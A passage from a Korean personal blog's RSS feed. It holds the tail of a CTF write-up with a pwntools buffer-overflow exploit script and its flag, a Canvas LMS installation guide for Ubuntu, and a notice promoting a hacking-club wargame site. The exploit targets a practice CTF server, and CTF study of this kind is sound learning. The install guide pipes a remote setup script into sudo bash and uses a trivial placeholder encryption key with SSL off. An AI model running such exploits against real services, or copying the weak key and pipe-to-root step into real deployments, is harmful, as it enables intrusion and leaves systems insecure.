process(&#x27;./bof101&#x27;)</span></span><br><span class="line"> <span class="number">6</span> </span><br><span class="line"> <span class="number">7</span> p = remote(<span class="string">&#x27;bof101.sstf.site&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"> <span class="number">8</span> </span><br><span class="line"> <span class="number">9</span> e = ELF(<span class="string">&#x27;./bof101&#x27;</span>)</span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span> p.recvuntil(<span class="string">&#x27;addr:&#x27;</span>)</span><br><span class="line"><span class="number">12</span> </span><br><span class="line"><span class="number">13</span> flag_addr = <span class="built_in">int</span>(p.recv(<span class="number">15</span>),<span class="number">16</span>)</span><br><span class="line"><span class="number">14</span> </span><br><span class="line"><span class="number">15</span> p.recvline()</span><br><span class="line"><span class="number">16</span> </span><br><span class="line"><span class="number">17</span> print(<span class="built_in">hex</span>(flag_addr))</span><br><span class="line"><span class="number">18</span> </span><br><span class="line"><span class="number">19</span> payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line"><span class="number">20</span> payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="number">21</span> payload += <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line"><span class="number">22</span> payload += p64(flag_addr)</span><br><span class="line"><span class="number">23</span> </span><br><span class="line"><span class="number">24</span> p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,payload)</span><br><span class="line"><span class="number">25</span> </span><br><span class="line"><span class="number">26</span> p.interactive()</span><br></pre></td></tr></table></figure><p><code> SCTF&#123;n0w_U_R_B0F_3xpEr7&#125; </code></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/BOF/">BOF</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/08/18/sstf-200818/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>canvas lms installation</title>
      <link>https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/</link>
      <guid>https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/</guid>
      <pubDate>Fri, 26 Jun 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;OS&quot;&gt;&lt;a href=&quot;#OS&quot; class=&quot;headerlink&quot; title=&quot;OS&quot;&gt;&lt;/a&gt;OS&lt;/h3&gt;&lt;p&gt;OS : Ubuntu 16.04 Desktop(&lt;a href=&quot;http://old-releases.ubuntu.com/rele</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h3><p>OS : Ubuntu 16.04 Desktop(<a href="http://old-releases.ubuntu.com/releases/16.04.4/">http://old-releases.ubuntu.com/releases/16.04.4/</a>)</p><p>Canvas LMS - Open Source : <a href="https://github.com/instructure/canvas-lms">https://github.com/instructure/canvas-lms</a></p><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><h3 id="postgresql-설치"><a href="#postgresql-설치" class="headerlink" title="postgresql 설치"></a>postgresql 설치</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install postgresql-9.5</span><br></pre></td></tr></table></figure><hr><h3 id="관리자-계정-생성"><a href="#관리자-계정-생성" class="headerlink" title="관리자 계정 생성"></a>관리자 계정 생성</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser sysadmin</span><br></pre></td></tr></table></figure><hr><h3 id="sysadmin-계정에-대한-Root-권한-부여"><a href="#sysadmin-계정에-대한-Root-권한-부여" class="headerlink" title="sysadmin 계정에 대한 Root 권한 부여"></a>sysadmin 계정에 대한 Root 권한 부여</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visudo → User Privileges → sysadmin ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><hr><h3 id="sysadmin-계정으로-사용자-변경"><a href="#sysadmin-계정으로-사용자-변경" class="headerlink" title="sysadmin 계정으로 사용자 변경"></a>sysadmin 계정으로 사용자 변경</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su sysadmin</span><br></pre></td></tr></table></figure><hr><h3 id="postgres-설정"><a href="#postgres-설정" class="headerlink" title="postgres 설정"></a>postgres 설정</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres createuser canvas --no-createdb \</span><br><span class="line">   --no-superuser --no-createrole --pwprompt</span><br><span class="line"></span><br><span class="line">sudo -u postgres createdb canvas_production --owner=canvas</span><br></pre></td></tr></table></figure><hr><h3 id="git-설정"><a href="#git-설정" class="headerlink" title="git 설정"></a>git 설정</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-core</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/instructure/canvas-lms.git canvas</span><br><span class="line"><span class="built_in">cd</span> canvas</span><br><span class="line">git checkout stable</span><br></pre></td></tr></table></figure><hr><h3 id="installation-1"><a href="#installation-1" class="headerlink" title="installation(1)"></a>installation(1)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /var/canvas</span><br><span class="line">sudo chown -R sysadmin /var/canvas</span><br><span class="line"></span><br><span class="line">$(canvas) cp -av . /var/canvas</span><br></pre></td></tr></table></figure><hr><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><hr><h3 id="ruby2-4-install"><a href="#ruby2-4-install" class="headerlink" title="ruby2.4 install"></a>ruby2.4 install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby2.4 ruby2.4-dev zlib1g-dev libxml2-dev \</span><br><span class="line">                       libsqlite3-dev postgresql libpq-dev \</span><br><span class="line">                       libxmlsec1-dev curl make g++</span><br></pre></td></tr></table></figure><hr><h3 id="node-js-install"><a href="#node-js-install" class="headerlink" title="node.js install"></a>node.js install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -</span><br><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure><hr><h3 id="set-sysadmin-postgres-superuser"><a href="#set-sysadmin-postgres-superuser" class="headerlink" title="set sysadmin postgres superuser"></a>set sysadmin postgres superuser</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u postgres createuser <span class="variable">$USER</span></span><br><span class="line">$ sudo -u postgres psql -c <span class="string">&quot;alter user <span class="variable">$USER</span> with superuser&quot;</span> postgres</span><br></pre></td></tr></table></figure><hr><h3 id="bundler-and-canvas-dependencies"><a href="#bundler-and-canvas-dependencies" class="headerlink" title="bundler and canvas dependencies"></a>bundler and canvas dependencies</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo gem install bundler --version 1.13.7</span><br><span class="line">$ bundle _1.13.7_ install --path vendor/bundle</span><br></pre></td></tr></table></figure><hr><h3 id="yarn-installation"><a href="#yarn-installation" class="headerlink" title="yarn installation"></a>yarn installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;deb https://dl.yarnpkg.com/debian/ stable main&quot;</span> | sudo tee /etc/apt/sources.list.d/yarn.list</span><br><span class="line">$ sudo apt-get update &amp;&amp; sudo apt-get install yarn=1.10.1-1</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install python</span><br><span class="line">$ yarn install</span><br></pre></td></tr></table></figure><hr><h3 id="canvas-default-config"><a href="#canvas-default-config" class="headerlink" title="canvas default config"></a>canvas default config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">for</span> config <span class="keyword">in</span> amazon_s3 database \</span><br><span class="line">  delayed_jobs domain file_store outgoing_mail security external_migration; \</span><br><span class="line">  <span class="keyword">do</span> cp config/<span class="variable">$config</span>.yml.example config/<span class="variable">$config</span>.yml; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><hr><h3 id="dynamic-setting"><a href="#dynamic-setting" class="headerlink" title="dynamic setting"></a>dynamic setting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/dynamic_settings.yml.example config/dynamic_settings.yml</span><br><span class="line">$ (check) nano config/dynamic_settings.yml (vi로 진행해도 상관 없음)</span><br></pre></td></tr></table></figure><hr><h3 id="database-setting"><a href="#database-setting" class="headerlink" title="database setting"></a>database setting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/database.yml.example config/database.yml</span><br><span class="line">$ (check) nano config/database.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do not create a queue: section for your test environment</span></span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_test</span><br><span class="line">  host: localhost</span><br><span class="line">  username: canvas</span><br><span class="line">  timeout: 5000</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_development</span><br><span class="line">  timeout: 5000</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_production</span><br><span class="line">  host: localhost</span><br><span class="line">  username: canvas</span><br><span class="line">  password: your_password</span><br><span class="line">  timeout: 5000</span><br></pre></td></tr></table></figure><hr><h3 id="outgoing-mail-config"><a href="#outgoing-mail-config" class="headerlink" title="outgoing mail config"></a>outgoing mail config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/outgoing_mail.yml.example config/outgoing_mail.yml</span><br><span class="line">$ (check) nano config/outgoing_mail.yml (vi로 진행해도 상관 없음)</span><br></pre></td></tr></table></figure><hr><h3 id="url-config"><a href="#url-config" class="headerlink" title="url config"></a>url config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/domain.yml.example config/domain.yml</span><br><span class="line">$ (check) nano config/domain.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  domain: <span class="string">&quot;canvas.jhyeon.xyz&quot;</span></span><br><span class="line">  <span class="comment"># whether this instance of canvas is served over ssl (https) or not</span></span><br><span class="line">  <span class="comment"># defaults to true for production, false for test/development</span></span><br><span class="line">  ssl: <span class="literal">false</span></span><br><span class="line">  <span class="comment"># files_domain: &quot;canvasfiles.example.com&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="security-config"><a href="#security-config" class="headerlink" title="security config"></a>security config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/security.yml.example config/security.yml</span><br><span class="line">$ nano config/security.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line">production: &amp;default</span><br><span class="line">  <span class="comment"># replace this with a random string of at least 20 characters</span></span><br><span class="line">  encryption_key: 12345123451234512345</span><br><span class="line">  lti_iss: <span class="string">&#x27;https://canvas.instructure.com&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="generate-assets"><a href="#generate-assets" class="headerlink" title="generate assets"></a>generate assets</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ (/var/canvas) mkdir -p <span class="built_in">log</span> tmp/pids public/assets app/stylesheets/brandable_css_brands</span><br><span class="line">$ (/var/canvas) touch app/stylesheets/_brandable_variables_defaults_autogenerated.scss</span><br><span class="line">$ (/var/canvas) touch Gemfile.lock</span><br><span class="line">$ (/var/canvas) touch <span class="built_in">log</span>/production.log</span><br><span class="line">$ (/var/canvas) sudo adduser --disabled-password --gecos canvas canvasuser</span><br><span class="line">$ (/var/canvas) sudo chown -R canvasuser config/environment.rb <span class="built_in">log</span> tmp public/assets \</span><br><span class="line">                              app/stylesheets/_brandable_variables_defaults_autogenerated.scss \</span><br><span class="line">                              app/stylesheets/brandable_css_brands Gemfile.lock config.ru</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ (/var/canvas) yarn install</span><br><span class="line">$ (/var/canvas) RAILS_ENV=production bundle <span class="built_in">exec</span> rake canvas:compile_assets</span><br><span class="line">$ (/var/canvas) sudo chown -R canvasuser public/dist/brandable_css</span><br><span class="line"></span><br><span class="line">$ (/var/canvas) RAILS_ENV=production bundle <span class="built_in">exec</span> rake brand_configs:generate_and_upload_all</span><br><span class="line"></span><br><span class="line">* VM 메모리 최소 8GB 메모리 구성 필요합니다.</span><br></pre></td></tr></table></figure><hr><h3 id="database-population"><a href="#database-population" class="headerlink" title="database population"></a>database population</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAILS_ENV=production bundle <span class="built_in">exec</span> rake db:initial_setup</span><br></pre></td></tr></table></figure><hr><h3 id="apache2-installation"><a href="#apache2-installation" class="headerlink" title="apache2 installation"></a>apache2 installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install passenger libapache2-mod-passenger apache2</span><br><span class="line">$ sudo a2enmod rewrite</span><br><span class="line">$ sudo a2enmod passenger</span><br><span class="line">$ sudo a2enmod ssl</span><br><span class="line">$ sudo unlink /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line">아래 단계 완료 후 수행</span><br><span class="line">$ sudo a2ensite canvas</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">  ServerName canvas.jhyeon.xyz</span><br><span class="line">  ServerAlias canvasfiles.canvas.jhyeon.xyz</span><br><span class="line">  ServerAdmin admin@canvas.jhyeon.xyz</span><br><span class="line">  DocumentRoot /var/canvas/public</span><br><span class="line">  ErrorLog /var/<span class="built_in">log</span>/apache2/canvas_errors.log</span><br><span class="line">  LogLevel warn</span><br><span class="line">  CustomLog /var/<span class="built_in">log</span>/apache2/canvas_access.log combined</span><br><span class="line">  SetEnv RAILS_ENV production</span><br><span class="line">  &lt;Directory /var/canvas/public&gt;</span><br><span class="line">    Options All</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">    Options -MultiViews</span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="cache-config"><a href="#cache-config" class="headerlink" title="cache config"></a>cache config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository ppa:chris-lea/redis-server</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install redis-server</span><br><span class="line"></span><br><span class="line">$ sudo cp config/cache_store.yml.example config/cache_store.yml</span><br><span class="line">$ sudo vi config/cache_store.yml</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line">development:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line">production:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line"></span><br><span class="line">$ sudo chown canvasuser config/cache_store.yml</span><br><span class="line"></span><br><span class="line">$ sudo cp config/redis.yml.example config/redis.yml</span><br><span class="line">$ sudo vi config/redis.yml</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  servers:</span><br><span class="line">    - redis://localhost</span><br><span class="line"></span><br><span class="line">$ sudo chown canvasuser config/redis.yml</span><br></pre></td></tr></table></figure><hr><h3 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s /var/canvas/script/canvas_init /etc/init.d/canvas_init</span><br><span class="line">$ sudo update-rc.d canvas_init defaults</span><br><span class="line">$ sudo /etc/init.d/canvas_init start</span><br><span class="line">$ sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure><hr><h3 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h3><ul><li><p><a href="https://github.com/instructure/canvas-lms/wiki/Production-Start">https://github.com/instructure/canvas-lms/wiki/Production-Start</a></p></li><li><p><a href="https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49">https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CANVAS/">CANVAS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/LMS/">LMS</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/06/27/canvas-install-200627/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>동아리 워게임 홍보(?)</title>
      <link>https://blog.jhyeon.dev/2020/06/19/bangsiri-wargame-200619/</link>
      <guid>https://blog.jhyeon.dev/2020/06/19/bangsiri-wargame-200619/</guid>
      <pubDate>Thu, 18 Jun 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;올해 3월을 끝으로 기존 CTFd 에서 운영하던 동아리 학습용 CTF 서버를&lt;/p&gt;
&lt;p&gt;자체 플랫폼으로 이전 하였습니당, 문제도 기존과 다르게 모의 해킹 분야별로 많이 업데이트 할 예정이고,&lt;/p&gt;
&lt;p&gt;동아리 원이 아니더라도 문제 풀어보실 수</description>
        
      
      
      
      <content:encoded><![CDATA[<p>올해 3월을 끝으로 기존 CTFd 에서 운영하던 동아리 학습용 CTF 서버를</p><p>자체 플랫폼으로 이전 하였습니당, 문제도 기존과 다르게 모의 해킹 분야별로 많이 업데이트 할 예정이고,</p><p>동아리 원이 아니더라도 문제 풀어보실 수 있으니 많이 이용 해주세요!</p><p><a href="https://wargame.hacking.one/">https://wargame.hacking.one/</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/B-ngsiri/">B@ngsiri</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/06/19/bangsiri-wargame-200619/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
